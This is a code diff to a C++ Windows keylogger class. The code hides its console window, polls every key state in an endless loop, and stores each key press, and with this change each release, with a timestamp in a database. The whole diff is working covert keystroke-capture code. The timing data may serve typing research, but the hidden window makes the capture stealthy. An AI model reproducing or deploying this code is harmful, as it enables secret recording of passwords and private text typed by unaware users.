@@ -21,19 +21,31 @@ void Keylogger::start(Database db)
     m_db = db;
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     char KEY = 'x';
+    int prevKey = 0;
+    int prevKeys[200] = {0};
 
     while (true) {
-        Sleep(10);
         for (int KEY = 8; KEY <= 190; KEY++)
         {
             if (GetAsyncKeyState(KEY) == -32767)
             {
+                if (prevKeys[KEY] == -32768)
+                {
+                    continue;
+                }
                 if (SpecialKeys(KEY) == false)
                 {
-                    uint64_t time = timeSinceEpochMillisec();
-                    m_db.insertKey("keyboard", time, KEY);
+                    const uint64_t time = timeSinceEpochMillisec();
+                    m_db.insertKeyboardKey("keyboard", time, KEY, 0);
                 }
             }
+            else if (prevKeys[KEY] == -32768 && GetAsyncKeyState(KEY) == 0)
+            {
+                const uint64_t time = timeSinceEpochMillisec();
+                m_db.insertKeyboardKey("keyboard", time, KEY, 1);
+            }
+
+            prevKeys[KEY] = GetAsyncKeyState(KEY);
         }
     }
 }
